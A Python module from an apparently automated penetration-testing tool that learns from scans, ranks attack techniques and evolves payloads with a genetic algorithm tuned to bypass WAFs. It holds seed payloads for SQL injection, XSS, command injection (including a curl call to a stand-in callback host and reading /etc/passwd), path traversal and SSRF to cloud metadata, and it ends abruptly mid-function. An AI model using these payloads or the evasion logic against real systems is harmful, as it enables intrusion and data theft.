#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
████████████████████████████████████████████████████████████████████████████████████
██                                                                                ██
██  🔄  SIREN SELF-EVOLUTION — Auto-Aprendizado & Evolução Contínua  🔄         ██
██                                                                                ██
██  TIER 5 META: SIREN evolui a cada scan. Nenhum pentest repete erros.          ██
██                                                                                ██
██  Subsistemas:                                                                  ██
██    • PatternLearner      — Detecta padrões de sucesso/falha across scans      ██
██    • StrategyOptimizer   — Multi-armed bandit para seleção de estratégia      ██
██    • PayloadEvolver      — Mutação genética de payloads com fitness function  ██
██    • TechniqueRanker     — ELO rating system para técnicas por contexto       ██
██    • FalsePositiveLearner — Aprende a distinguir TP vs FP por assinatura      ██
██    • TargetProfiler      — Fingerprint e clustering de alvos                  ██
██    • EvolutionDB         — Persistência SQLite-free de aprendizado            ██
██    • SirenSelfEvolution  — Orquestrador principal do ciclo evolutivo          ██
██                                                                                ██
██  Inspiração acadêmica:                                                         ██
██    • Thompson Sampling (Chapelle & Li, 2011) — Bayesian bandits               ██
██    • MAP-Elites (Mouret & Clune, 2015) — Quality-Diversity algorithms         ██
██    • Elo rating (Elo, 1978) — Competitive ranking systems                     ██
██    • Genetic Programming (Koza, 1992) — Evolved program structures            ██
██                                                                                ██
██  "SIREN não comete o mesmo erro duas vezes. Ela EVOLUI."                      ██
██                                                                                ██
████████████████████████████████████████████████████████████████████████████████████
"""

from __future__ import annotations

import copy
import hashlib
import json
import logging
import math
import os
import random
import struct
import threading
import time
from collections import defaultdict, deque
from concurrent.futures import ThreadPoolExecutor
from dataclasses import dataclass, field
from enum import Enum, auto
from pathlib import Path
from typing import (
    Any,
    Callable,
    Deque,
    Dict,
    FrozenSet,
    Iterator,
    List,
    Optional,
    Set,
    Tuple,
    Union,
)

logger = logging.getLogger("siren.meta.self_evolution")


# ════════════════════════════════════════════════════════════════════════════════
# CONSTANTS
# ════════════════════════════════════════════════════════════════════════════════

THREAD_POOL_SIZE = 4
MAX_HISTORY_SIZE = 50_000        # Max records in evolution DB
ELO_K_FACTOR = 32.0             # Standard Elo K-factor
ELO_DEFAULT_RATING = 1500.0     # Starting Elo rating
BANDIT_EXPLORATION = 1.414       # UCB1 exploration constant (sqrt(2))
MUTATION_RATE = 0.15             # Base genetic mutation rate
CROSSOVER_RATE = 0.7             # Genetic crossover probability
POPULATION_SIZE = 50             # Default GA population size
ELITE_FRACTION = 0.1             # Top 10% preserved per generation
MIN_SAMPLES_FOR_LEARNING = 5    # Min observations before pattern is confident
FP_DECAY_FACTOR = 0.95          # Exponential decay for FP signal memory
PROFILE_SIMILARITY_THRESHOLD = 0.75  # Clustering similarity threshold


# ════════════════════════════════════════════════════════════════════════════════
# ENUMS
# ════════════════════════════════════════════════════════════════════════════════

class OutcomeType(Enum):
    """Result type of a technique/payload execution."""
    SUCCESS = auto()           # Vulnerability confirmed
    PARTIAL = auto()           # Partial success (info leak, timing anomaly)
    FAILURE = auto()           # Technique did not work
    BLOCKED = auto()           # Blocked by WAF/IDS/firewall
    ERROR = auto()             # Execution error (network, timeout)
    FALSE_POSITIVE = auto()    # Initially flagged but later confirmed FP


class TechniqueCategory(Enum):
    """Categories of offensive techniques."""
    INJECTION = auto()
    XSS = auto()
    AUTH_BYPASS = auto()
    PATH_TRAVERSAL = auto()
    SSRF = auto()
    DESERIALIZATION = auto()
    FILE_UPLOAD = auto()
    COMMAND_INJECTION = auto()
    IDOR = auto()
    CRYPTO = auto()
    MISCONFIG = auto()
    INFO_DISCLOSURE = auto()
    BUSINESS_LOGIC = auto()
    RACE_CONDITION = auto()


class MutationType(Enum):
    """Types of payload mutation operators."""
    CASE_SWAP = auto()          # aLtErNaTe case
    ENCODING = auto()           # URL/HTML/Unicode encode
    DOUBLE_ENCODING = auto()    # Double URL encode
    COMMENT_INJECTION = auto()  # SQL: /**/  HTML: <!-- -->
    WHITESPACE_SUB = auto()     # Tabs, newlines, null bytes
    CONCAT_SPLIT = auto()       # String concatenation tricks
    UNICODE_HOMOGLYPH = auto()  # Visually similar Unicode chars
    NULL_BYTE = auto()          # %00 injection
    NESTED_PAYLOAD = auto()     # Payload within payload
    BOUNDARY_EXPAND = auto()    # Expand numeric/string boundaries
    POLYGLOT = auto()           # Cross-context payloads
    SEMANTIC_EQUIV = auto()     # Same effect, different syntax


class TargetArchetype(Enum):
    """Common target archetypes for clustering."""
    CORPORATE_WEBAPP = auto()
    API_MICROSERVICE = auto()
    LEGACY_MONOLITH = auto()
    CLOUD_NATIVE = auto()
    IOT_EMBEDDED = auto()
    MOBILE_BACKEND = auto()
    WORDPRESS_CMS = auto()
    ECOMMERCE = auto()
    FINANCIAL_APP = auto()
    HEALTHCARE_APP = auto()


class LearningSignal(Enum):
    """Types of learning signals captured."""
    TECHNIQUE_OUTCOME = auto()
    PAYLOAD_FITNESS = auto()
    CHAIN_SUCCESS = auto()
    FALSE_POSITIVE = auto()
    WAF_EVASION = auto()
    TIMING_PATTERN = auto()
    TARGET_RESPONSE = auto()
    SCAN_DURATION = auto()


# ════════════════════════════════════════════════════════════════════════════════
# DATA CLASSES
# ════════════════════════════════════════════════════════════════════════════════

@dataclass
class TechniqueRecord:
    """Record of a technique execution with metadata."""
    technique_id: str
    category: TechniqueCategory
    target_context: Dict[str, Any] = field(default_factory=dict)
    outcome: OutcomeType = OutcomeType.FAILURE
    timestamp: float = field(default_factory=time.time)
    duration_ms: float = 0.0
    payload_used: str = ""
    response_code: int = 0
    response_size: int = 0
    waf_detected: bool = False
    waf_type: str = ""
    evidence: str = ""
    confidence: float = 0.0
    scan_id: str = ""

    def to_dict(self) -> Dict[str, Any]:
        return {
            "technique_id": self.technique_id,
            "category": self.category.name,
            "target_context": self.target_context,
            "outcome": self.outcome.name,
            "timestamp": self.timestamp,
            "duration_ms": self.duration_ms,
            "payload_used": self.payload_used,
            "response_code": self.response_code,
            "response_size": self.response_size,
            "waf_detected": self.waf_detected,
            "waf_type": self.waf_type,
            "evidence": self.evidence,
            "confidence": self.confidence,
            "scan_id": self.scan_id,
        }

    @classmethod
    def from_dict(cls, d: Dict[str, Any]) -> TechniqueRecord:
        return cls(
            technique_id=d["technique_id"],
            category=TechniqueCategory[d["category"]],
            target_context=d.get("target_context", {}),
            outcome=OutcomeType[d["outcome"]],
            timestamp=d.get("timestamp", 0.0),
            duration_ms=d.get("duration_ms", 0.0),
            payload_used=d.get("payload_used", ""),
            response_code=d.get("response_code", 0),
            response_size=d.get("response_size", 0),
            waf_detected=d.get("waf_detected", False),
            waf_type=d.get("waf_type", ""),
            evidence=d.get("evidence", ""),
            confidence=d.get("confidence", 0.0),
            scan_id=d.get("scan_id", ""),
        )


@dataclass
class PayloadGene:
    """A payload represented as an evolvable genetic structure."""
    payload_id: str
    raw: str                                 # The actual payload string
    category: TechniqueCategory = TechniqueCategory.INJECTION
    mutations_applied: List[MutationType] = field(default_factory=list)
    fitness: float = 0.0                     # [0, 1] composite fitness
    generation: int = 0
    parent_ids: List[str] = field(default_factory=list)
    success_count: int = 0
    attempt_count: int = 0
    bypass_count: int = 0                    # Times it bypassed WAF
    avg_response_time_ms: float = 0.0
    contexts_effective: Set[str] = field(default_factory=set)
    created_at: float = field(default_factory=time.time)

    @property
    def success_rate(self) -> float:
        if self.attempt_count == 0:
            return 0.0
        return self.success_count / self.attempt_count

    @property
    def bypass_rate(self) -> float:
        if self.attempt_count == 0:
            return 0.0
        return self.bypass_count / self.attempt_count

    def compute_fitness(self) -> float:
        """Multi-objective fitness: success × bypass × speed × versatility."""
        sr = self.success_rate
        br = self.bypass_rate
        # Speed bonus: faster payloads score higher (normalized 0-1)
        speed = max(0.0, 1.0 - (self.avg_response_time_ms / 5000.0))
        # Versatility: works in more contexts = better
        versatility = min(1.0, len(self.contexts_effective) / 5.0)
        self.fitness = (
            0.40 * sr +
            0.25 * br +
            0.15 * speed +
            0.20 * versatility
        )
        return self.fitness

    def to_dict(self) -> Dict[str, Any]:
        return {
            "payload_id": self.payload_id,
            "raw": self.raw,
            "category": self.category.name,
            "mutations_applied": [m.name for m in self.mutations_applied],
            "fitness": self.fitness,
            "generation": self.generation,
            "parent_ids": self.parent_ids,
            "success_count": self.success_count,
            "attempt_count": self.attempt_count,
            "bypass_count": self.bypass_count,
            "avg_response_time_ms": self.avg_response_time_ms,
            "contexts_effective": list(self.contexts_effective),
            "created_at": self.created_at,
        }

    @classmethod
    def from_dict(cls, d: Dict[str, Any]) -> PayloadGene:
        return cls(
            payload_id=d["payload_id"],
            raw=d["raw"],
            category=TechniqueCategory[d.get("category", "INJECTION")],
            mutations_applied=[MutationType[m] for m in d.get("mutations_applied", [])],
            fitness=d.get("fitness", 0.0),
            generation=d.get("generation", 0),
            parent_ids=d.get("parent_ids", []),
            success_count=d.get("success_count", 0),
            attempt_count=d.get("attempt_count", 0),
            bypass_count=d.get("bypass_count", 0),
            avg_response_time_ms=d.get("avg_response_time_ms", 0.0),
            contexts_effective=set(d.get("contexts_effective", [])),
            created_at=d.get("created_at", 0.0),
        )


@dataclass
class TargetProfile:
    """Fingerprint of a target based on observed behavior."""
    profile_id: str
    technologies: Set[str] = field(default_factory=set)
    waf_type: str = ""
    response_patterns: Dict[str, float] = field(default_factory=dict)
    # Feature vector for clustering (normalized 0-1 per dimension)
    features: Dict[str, float] = field(default_factory=dict)
    archetype: Optional[TargetArchetype] = None
    # Which techniques worked/failed on this profile
    technique_outcomes: Dict[str, List[OutcomeType]] = field(default_factory=dict)
    similar_profiles: List[str] = field(default_factory=list)
    first_seen: float = field(default_factory=time.time)
    last_seen: float = field(default_factory=time.time)
    scan_count: int = 0

    def feature_vector(self) -> List[float]:
        """Return sorted feature vector for similarity computation."""
        return [self.features[k] for k in sorted(self.features.keys())]

    def to_dict(self) -> Dict[str, Any]:
        return {
            "profile_id": self.profile_id,
            "technologies": list(self.technologies),
            "waf_type": self.waf_type,
            "response_patterns": self.response_patterns,
            "features": self.features,
            "archetype": self.archetype.name if self.archetype else None,
            "technique_outcomes": {
                k: [o.name for o in v]
                for k, v in self.technique_outcomes.items()
            },
            "similar_profiles": self.similar_profiles,
            "first_seen": self.first_seen,
            "last_seen": self.last_seen,
            "scan_count": self.scan_count,
        }

    @classmethod
    def from_dict(cls, d: Dict[str, Any]) -> TargetProfile:
        tp = cls(
            profile_id=d["profile_id"],
            technologies=set(d.get("technologies", [])),
            waf_type=d.get("waf_type", ""),
            response_patterns=d.get("response_patterns", {}),
            features=d.get("features", {}),
            archetype=TargetArchetype[d["archetype"]] if d.get("archetype") else None,
            similar_profiles=d.get("similar_profiles", []),
            first_seen=d.get("first_seen", 0.0),
            last_seen=d.get("last_seen", 0.0),
            scan_count=d.get("scan_count", 0),
        )
        tp.technique_outcomes = {
            k: [OutcomeType[o] for o in v]
            for k, v in d.get("technique_outcomes", {}).items()
        }
        return tp


@dataclass
class FPSignature:
    """Signature pattern for a known false positive."""
    signature_id: str
    technique_id: str
    pattern_hash: str                    # Hash of the FP signature
    response_code: int = 0
    response_body_pattern: str = ""      # Regex or substring
    response_size_range: Tuple[int, int] = (0, 0)
    target_context_match: Dict[str, str] = field(default_factory=dict)
    confidence: float = 0.5
    observations: int = 0
    last_seen: float = field(default_factory=time.time)

    def matches(self, record: TechniqueRecord) -> float:
        """Return match score [0, 1] against a technique record."""
        score = 0.0
        checks = 0

        if self.response_code > 0:
            checks += 1
            if record.response_code == self.response_code:
                score += 1.0

        if self.response_body_pattern:
            checks += 1
            if self.response_body_pattern in record.evidence:
                score += 1.0

        if self.response_size_range != (0, 0):
            checks += 1
            lo, hi = self.response_size_range
            if lo <= record.response_size <= hi:
                score += 1.0

        if self.target_context_match:
            for key, expected_val in self.target_context_match.items():
                checks += 1
                actual = record.target_context.get(key, "")
                if isinstance(actual, str) and expected_val.lower() in actual.lower():
                    score += 1.0

        if checks == 0:
            return 0.0
        return (score / checks) * self.confidence


# ════════════════════════════════════════════════════════════════════════════════
# PATTERN LEARNER — Detect success/failure patterns across scans
# ════════════════════════════════════════════════════════════════════════════════

class PatternLearner:
    """
    Learns recurring patterns from technique execution history.

    Analyzes:
    - Which technique categories succeed on which technology stacks
    - Time-of-day and ordering effects
    - Payload length and structure correlations
    - WAF evasion patterns that work
    """

    def __init__(self) -> None:
        self._lock = threading.RLock()
        # tech_stack -> category -> {success, total}
        self._tech_category_stats: Dict[str, Dict[str, Dict[str, int]]] = defaultdict(
            lambda: defaultdict(lambda: {"success": 0, "total": 0})
        )
        # category -> payload_length_bin -> {success, total}
        self._length_stats: Dict[str, Dict[int, Dict[str, int]]] = defaultdict(
            lambda: defaultdict(lambda: {"success": 0, "total": 0})
        )
        # category -> response_code -> count
        self._response_code_dist: Dict[str, Dict[int, int]] = defaultdict(
            lambda: defaultdict(int)
        )
        # Ordering patterns: (technique_a, technique_b) -> success rate when a before b
        self._ordering_effects: Dict[Tuple[str, str], Dict[str, int]] = defaultdict(
            lambda: {"success": 0, "total": 0}
        )
        # WAF evasion patterns: waf_type -> mutation_type -> {bypass, total}
        self._waf_evasion: Dict[str, Dict[str, Dict[str, int]]] = defaultdict(
            lambda: defaultdict(lambda: {"bypass": 0, "total": 0})
        )
        self._total_records = 0

    def record_outcome(self, record: TechniqueRecord) -> None:
        """Ingest a technique execution record and update all pattern models."""
        with self._lock:
            self._total_records += 1
            cat = record.category.name
            is_success = record.outcome in (OutcomeType.SUCCESS, OutcomeType.PARTIAL)

            # 1) Tech stack → category success rates
            for tech in self._extract_techs(record.target_context):
                stats = self._tech_category_stats[tech][cat]
                stats["total"] += 1
                if is_success:
                    stats["success"] += 1

            # 2) Payload length binning (50-char bins)
            if record.payload_used:
                length_bin = len(record.payload_used) // 50
                stats = self._length_stats[cat][length_bin]
                stats["total"] += 1
                if is_success:
                    stats["success"] += 1

            # 3) Response code distribution
            if record.response_code > 0:
                self._response_code_dist[cat][record.response_code] += 1

            # 4) WAF evasion patterns
            if record.waf_detected and record.waf_type:
                for mut in self._extract_mutations(record.payload_used):
                    stats = self._waf_evasion[record.waf_type][mut]
                    stats["total"] += 1
                    if record.outcome != OutcomeType.BLOCKED:
                        stats["bypass"] += 1

    def record_ordering(
        self,
        technique_a: str,
        technique_b: str,
        b_succeeded: bool,
    ) -> None:
        """Record that technique_b was attempted after technique_a."""
        with self._lock:
            key = (technique_a, technique_b)
            self._ordering_effects[key]["total"] += 1
            if b_succeeded:
                self._ordering_effects[key]["success"] += 1

    def get_best_techniques_for_tech(
        self, tech_stack: str, top_n: int = 5
    ) -> List[Tuple[str, float]]:
        """Return top technique categories for a given tech stack, by success rate."""
        with self._lock:
            categories = self._tech_category_stats.get(tech_stack, {})
            scored: List[Tuple[str, float]] = []
            for cat, stats in categories.items():
                if stats["total"] >= MIN_SAMPLES_FOR_LEARNING:
                    rate = stats["success"] / max(1, stats["total"])
                    scored.append((cat, rate))
            scored.sort(key=lambda x: x[1], reverse=True)
            return scored[:top_n]

    def get_optimal_payload_length(self, category: str) -> Optional[Tuple[int, int]]:
        """Return optimal payload length range for a category."""
        with self._lock:
            bins = self._length_stats.get(category, {})
            best_bin = -1
            best_rate = 0.0
            for bin_idx, stats in bins.items():
                if stats["total"] >= MIN_SAMPLES_FOR_LEARNING:
                    rate = stats["success"] / max(1, stats["total"])
                    if rate > best_rate:
                        best_rate = rate
                        best_bin = bin_idx
            if best_bin < 0:
                return None
            return (best_bin * 50, (best_bin + 1) * 50)

    def get_waf_evasion_recommendations(
        self, waf_type: str, top_n: int = 3
    ) -> List[Tuple[str, float]]:
        """Return best mutation types for evading a specific WAF."""
        with self._lock:
            muts = self._waf_evasion.get(waf_type, {})
            scored: List[Tuple[str, float]] = []
            for mut, stats in muts.items():
                if stats["total"] >= MIN_SAMPLES_FOR_LEARNING:
                    rate = stats["bypass"] / max(1, stats["total"])
                    scored.append((mut, rate))
            scored.sort(key=lambda x: x[1], reverse=True)
            return scored[:top_n]

    def get_ordering_suggestion(self, technique: str) -> Optional[str]:
        """Suggest which technique to run BEFORE `technique` for best success."""
        with self._lock:
            best_prior: Optional[str] = None
            best_rate = 0.0
            for (a, b), stats in self._ordering_effects.items():
                if b == technique and stats["total"] >= MIN_SAMPLES_FOR_LEARNING:
                    rate = stats["success"] / max(1, stats["total"])
                    if rate > best_rate:
                        best_rate = rate
                        best_prior = a
            return best_prior

    def get_all_patterns(self) -> Dict[str, Any]:
        """Export all learned patterns as a dictionary."""
        with self._lock:
            return {
                "total_records": self._total_records,
                "tech_category_stats": {
                    t: dict(cats) for t, cats in self._tech_category_stats.items()
                },
                "waf_evasion": {
                    w: dict(muts) for w, muts in self._waf_evasion.items()
                },
                "ordering_effects_count": len(self._ordering_effects),
            }

    @staticmethod
    def _extract_techs(ctx: Dict[str, Any]) -> List[str]:
        """Extract technology names from target context."""
        techs: List[str] = []
        for key in ("technologies", "tech_stack", "server", "framework"):
            val = ctx.get(key)
            if isinstance(val, list):
                techs.extend(str(v).lower() for v in val)
            elif isinstance(val, str) and val:
                techs.append(val.lower())
        return techs if techs else ["unknown"]

    @staticmethod
    def _extract_mutations(payload: str) -> List[str]:
        """Heuristically detect which mutation types a payload contains."""
        muts: List[str] = []
        if "%25" in payload or "%2525" in payload:
            muts.append(MutationType.DOUBLE_ENCODING.name)
        elif "%" in payload:
            muts.append(MutationType.ENCODING.name)
        if "/*" in payload or "<!--" in payload:
            muts.append(MutationType.COMMENT_INJECTION.name)
        if "\x00" in payload or "%00" in payload:
            muts.append(MutationType.NULL_BYTE.name)
        if any(c in payload for c in "\t\n\r\x0b\x0c"):
            muts.append(MutationType.WHITESPACE_SUB.name)
        # Check for concat patterns: '+'|| CONCAT(
        if "CONCAT(" in payload.upper() or "||" in payload or "'+" in payload:
            muts.append(MutationType.CONCAT_SPLIT.name)
        return muts if muts else [MutationType.CASE_SWAP.name]


# ════════════════════════════════════════════════════════════════════════════════
# STRATEGY OPTIMIZER — Multi-Armed Bandit for strategy selection
# ════════════════════════════════════════════════════════════════════════════════

class StrategyOptimizer:
    """
    Uses Thompson Sampling + UCB1 hybrid to select optimal attack strategies.

    Each "arm" is a strategy (technique category × context), and we balance
    exploration vs exploitation to converge on the best approach faster.
    """

    def __init__(self, exploration: float = BANDIT_EXPLORATION) -> None:
        self._lock = threading.RLock()
        self._exploration = exploration
        # arm_id -> (alpha, beta) for Thompson Sampling (Beta distribution)
        self._arms: Dict[str, Tuple[float, float]] = {}
        # arm_id -> (total_reward, total_pulls) for UCB1
        self._ucb_stats: Dict[str, Tuple[float, int]] = {}
        self._total_pulls = 0

    def register_arm(self, arm_id: str) -> None:
        """Register a new strategy arm with slightly optimistic prior."""
        with self._lock:
            if arm_id not in self._arms:
                self._arms[arm_id] = (2.0, 2.0)  # Beta(2,2) = slightly optimistic
                self._ucb_stats[arm_id] = (0.0, 0)

    def register_arms_bulk(self, arm_ids: List[str]) -> None:
        """Register multiple arms at once."""
        with self._lock:
            for arm_id in arm_ids:
                if arm_id not in self._arms:
                    self._arms[arm_id] = (2.0, 2.0)  # Beta(2,2) = slightly optimistic
                    self._ucb_stats[arm_id] = (0.0, 0)

    def update(self, arm_id: str, reward: float) -> None:
        """
        Update arm with observed reward.

        Args:
            arm_id: Strategy identifier.
            reward: [0, 1] where 1 = full success, 0 = failure.
        """
        with self._lock:
            self._total_pulls += 1

            # Thompson Sampling update: Beta(alpha + reward, beta + (1 - reward))
            alpha, beta = self._arms.get(arm_id, (2.0, 2.0))
            self._arms[arm_id] = (alpha + reward, beta + (1.0 - reward))

            # UCB1 update
            total_reward, pulls = self._ucb_stats.get(arm_id, (0.0, 0))
            self._ucb_stats[arm_id] = (total_reward + reward, pulls + 1)

    def select_thompson(self, available_arms: Optional[List[str]] = None) -> str:
        """Select arm via Thompson Sampling (sample from posterior Beta)."""
        with self._lock:
            arms = available_arms or list(self._arms.keys())
            if not arms:
                return ""

            best_arm = arms[0]
            best_sample = -1.0
            for arm_id in arms:
                alpha, beta = self._arms.get(arm_id, (2.0, 2.0))
                # Beta distribution sampling using inverse transform
                sample = self._beta_sample(alpha, beta)
                # Cold start bonus for arms with fewer than 10 pulls
                sample += self._cold_start_bonus(arm_id)
                if sample > best_sample:
                    best_sample = sample
                    best_arm = arm_id
            return best_arm

    def select_ucb1(self, available_arms: Optional[List[str]] = None) -> str:
        """Select arm via UCB1 (Upper Confidence Bound)."""
        with self._lock:
            arms = available_arms or list(self._arms.keys())
            if not arms:
                return ""

            best_arm = arms[0]
            best_ucb = -1.0

            for arm_id in arms:
                total_reward, pulls = self._ucb_stats.get(arm_id, (0.0, 0))
                if pulls == 0:
                    return arm_id  # Explore unpulled arms first

                avg_reward = total_reward / pulls
                exploration_bonus = self._exploration * math.sqrt(
                    math.log(max(1, self._total_pulls)) / pulls
                )
                ucb_value = avg_reward + exploration_bonus + self._cold_start_bonus(arm_id)
                if ucb_value > best_ucb:
                    best_ucb = ucb_value
                    best_arm = arm_id
            return best_arm

    def select_hybrid(self, available_arms: Optional[List[str]] = None) -> str:
        """
        Hybrid: Thompson Sampling for initial exploration, UCB1 for exploitation.
        Switches after sufficient data is collected.
        """
        with self._lock:
            arms = available_arms or list(self._arms.keys())
            if not arms:
                return ""
            # Use Thompson when data is scarce, UCB1 when confident
            min_pulls = min(
                self._ucb_stats.get(a, (0.0, 0))[1] for a in arms
            ) if arms else 0
            if min_pulls < MIN_SAMPLES_FOR_LEARNING:
                return self.select_thompson(arms)
            return self.select_ucb1(arms)

    def get_arm_stats(self) -> Dict[str, Dict[str, float]]:
        """Get statistics for all arms."""
        with self._lock:
            result: Dict[str, Dict[str, float]] = {}
            for arm_id in self._arms:
                alpha, beta = self._arms[arm_id]
                total_reward, pulls = self._ucb_stats.get(arm_id, (0.0, 0))
                expected = alpha / (alpha + beta) if (alpha + beta) > 0 else 0.5
                result[arm_id] = {
                    "expected_reward": round(expected, 4),
                    "alpha": alpha,
                    "beta": beta,
                    "pulls": pulls,
                    "avg_reward": round(total_reward / max(1, pulls), 4),
                }
            return result

    def get_top_arms(self, n: int = 5) -> List[Tuple[str, float]]:
        """Return top-N arms by expected reward."""
        with self._lock:
            scored: List[Tuple[str, float]] = []
            for arm_id, (alpha, beta) in self._arms.items():
                expected = alpha / (alpha + beta) if (alpha + beta) > 0 else 0.5
                scored.append((arm_id, expected))
            scored.sort(key=lambda x: x[1], reverse=True)
            return scored[:n]

    def _cold_start_bonus(self, arm_id: str) -> float:
        """Extra exploration bonus for arms with fewer than 10 pulls."""
        _, arm_pulls = self._ucb_stats.get(arm_id, (0.0, 0))
        if arm_pulls >= 10:
            return 0.0
        return math.sqrt(math.log(self._total_pulls + 1) / (arm_pulls + 1))

    @staticmethod
    def _beta_sample(alpha: float, beta: float) -> float:
        """
        Sample from Beta(alpha, beta) using Jöhnk's algorithm.
        Falls back to mean if parameters are extreme.
        """
        if alpha <= 0 or beta <= 0:
            return 0.5
        if alpha > 500 or beta > 500:
            # For large params, use normal approximation
            mean = alpha / (alpha + beta)
            var = (alpha * beta) / ((alpha + beta) ** 2 * (alpha + beta + 1))
            return max(0.0, min(1.0, random.gauss(mean, math.sqrt(var))))
        # Use Python's built-in beta variate
        return random.betavariate(alpha, beta)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "arms": {k: list(v) for k, v in self._arms.items()},
            "ucb_stats": {k: list(v) for k, v in self._ucb_stats.items()},
            "total_pulls": self._total_pulls,
            "exploration": self._exploration,
        }

    @classmethod
    def from_dict(cls, d: Dict[str, Any]) -> StrategyOptimizer:
        obj = cls(exploration=d.get("exploration", BANDIT_EXPLORATION))
        obj._arms = {k: tuple(v) for k, v in d.get("arms", {}).items()}
        obj._ucb_stats = {k: tuple(v) for k, v in d.get("ucb_stats", {}).items()}
        obj._total_pulls = d.get("total_pulls", 0)
        return obj


# ════════════════════════════════════════════════════════════════════════════════
# PAYLOAD EVOLVER — Genetic algorithm for payload mutation
# ════════════════════════════════════════════════════════════════════════════════

class PayloadEvolver:
    """
    Evolves payloads using genetic programming:
    - Selection: Tournament + elitism
    - Crossover: Single-point and uniform
    - Mutation: 12 specialized operators (case, encoding, concat, etc.)
    - Fitness: Multi-objective (success rate × WAF bypass × speed × versatility)
    """

    # ── Seed payloads per category ──────────────────────────────────────────
    SEED_PAYLOADS: Dict[str, List[str]] = {
        "INJECTION": [
            "' OR '1'='1",
            "' OR 1=1--",
            "\" OR \"\"=\"",
            "') OR ('1'='1",
            "' UNION SELECT NULL--",
            "1; SELECT pg_sleep(5)--",
            "' AND 1=CONVERT(int,(SELECT @@version))--",
            "admin'--",
        ],
        "XSS": [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "javascript:alert(1)",
            "\"><script>alert(1)</script>",
            "'-alert(1)-'",
            "<details open ontoggle=alert(1)>",
        ],
        "COMMAND_INJECTION": [
            "; id",
            "| cat /etc/passwd",
            "$(whoami)",
            "`id`",
            "|| ping -c 3 127.0.0.1",
            "; curl http://CALLBACK/",
            "\nid\n",
        ],
        "PATH_TRAVERSAL": [
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "..%252f..%252f..%252fetc/passwd",
            "..%c0%af..%c0%af..%c0%afetc/passwd",
            "/proc/self/environ",
            "....\\....\\....\\windows\\win.ini",
        ],
        "SSRF": [
            "http://127.0.0.1:80",
            "http://[::1]:80",
            "http://0x7f000001",
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "gopher://127.0.0.1:6379/_INFO",
        ],
    }

    def __init__(
        self,
        population_size: int = POPULATION_SIZE,
        mutation_rate: float = MUTATION_RATE,
        crossover_rate: float = CROSSOVER_RATE,
        elite_fraction: float = ELITE_FRACTION,
    ) -> None:
        self._lock = threading.RLock()
        self._population_size = population_size
        self._mutation_rate = mutation_rate
        self._crossover_rate = crossover_rate
        self._elite_fraction = elite_fraction
        # category -> list of PayloadGene
        self._populations: Dict[str, List[PayloadGene]] = {}
        self._generation: Dict[str, int] = defaultdict(int)
        self._gene_counter = 0

    def initialize_population(self, category: str) -> List[PayloadGene]:
        """Create initial population from seed payloads + random mutations."""
        with self._lock:
            seeds = self.SEED_PAYLOADS.get(category, self.SEED_PAYLOADS["INJECTION"])
            population: List[PayloadGene] = []

            # Add seeds as generation 0
            for seed in seeds:
                gene = self._create_gene(seed, TechniqueCategory[category], gen=0)
                population.append(gene)

            # Fill rest with mutations of seeds
            while len(population) < self._population_size:
                parent = random.choice(seeds)
                mutated = self._mutate_payload(parent)
                gene = self._create_gene(
                    mutated,
                    TechniqueCategory[category],
                    gen=0,
                    mutations=[random.choice(list(MutationType))],
                )
                population.append(gene)

            self._populations[category] = population
            self._generation[category] = 0
            return population

    def evolve_generation(self, category: str) -> List[PayloadGene]:
        """
        Run one generation of evolution on a payload category.

        Returns the new population.
        """
        with self._lock:
            population = self._populations.get(category, [])
            if not population:
                return self.initialize_population(category)

            # Recompute fitness for all
            for gene in population:
                gene.compute_fitness()

            # Sort by fitness descending
            population.sort(key=lambda g: g.fitness, reverse=True)

            new_population: List[PayloadGene] = []

            # Elitism: preserve top performers
            elite_count = max(1, int(len(population) * self._elite_fraction))
            elites = population[:elite_count]
            new_population.extend(copy.deepcopy(elites))

            # Fill rest via tournament selection + crossover + mutation
            while len(new_population) < self._population_size:
                parent_a = self._tournament_select(population, k=3)
                parent_b = self._tournament_select(population, k=3)

                if random.random() < self._crossover_rate:
                    child_raw = self._crossover(parent_a.raw, parent_b.raw)
                    parents = [parent_a.payload_id, parent_b.payload_id]
                else:
                    child_raw = parent_a.raw
                    parents = [parent_a.payload_id]

                if random.random() < self._mutation_rate:
                    child_raw = self._mutate_payload(child_raw)

                gen = self._generation[category] + 1
                child = self._create_gene(
                    child_raw,
                    TechniqueCategory[category] if category in TechniqueCategory.__members__ else TechniqueCategory.INJECTION,
                    gen=gen,
                    parents=parents,
                )
                new_population.append(child)

            self._generation[category] += 1
            self._populations[category] = new_population
            return new_population

    def record_result(
        self,
        payload_id: str,
        category: str,
        success: bool,
        bypassed_waf: bool = False,
        response_time_ms: float = 0.0,
        context: str = "",
    ) -> None:
        """Record execution result for a payload gene."""
        with self._lock:
            population = self._populations.get(category, [])
            for gene in population:
                if gene.payload_id == payload_id:
                    gene.attempt_count += 1
                    if success:
                        gene.success_count += 1
                    if bypassed_waf:
                        gene.bypass_count += 1
                    if response_time_ms > 0:
                        total = gene.avg_response_time_ms * max(1, gene.attempt_count - 1)
                        gene.avg_response_time_ms = (
                            (total + response_time_ms) / gene.attempt_count
                        )
                    if context:
                        gene.contexts_effective.add(context)
                    gene.compute_fitness()
                    break

    def get_top_payloads(
        self, category: str, n: int = 10
    ) -> List[PayloadGene]:
        """Get top N payloads by fitness for a category."""
        with self._lock:
            population = self._populations.get(category, [])
            for gene in population:
                gene.compute_fitness()
            sorted_pop = sorted(population, key=lambda g: g.fitness, reverse=True)
            return sorted_pop[:n]

    def get_generation(self, category: str) -> int:
        """Return current generation number for a category."""
        with self._lock:
            return self._generation.get(category, 0)

    # ── Genetic operators ───────────────────────────────────────────────────

    def _mutate_payload(self, payload: str) -> str:
        """Apply a random mutation operator to a payload."""
        op = random.choice(list(MutationType))
        return self._apply_mutation(payload, op)

    @staticmethod
    def _apply_mutation(payload: str, op: MutationType) -> str:
        """Apply specific mutation operator."""
        if op == MutationType.CASE_SWAP:
            return "".join(
                c.swapcase() if random.random() < 0.3 else c for c in payload
            )
        elif op == MutationType.ENCODING:
            # URL-encode random characters
            result = []
            for c in payload:
                if random.random() < 0.2 and c.isalpha():
                    result.append(f"%{ord(c):02X}")
                else:
                    result.append(c)
            return "".join(result)
        elif op == MutationType.DOUBLE_ENCODING:
            result = []
            for c in payload:
                if random.random() < 0.15 and c.isalpha():
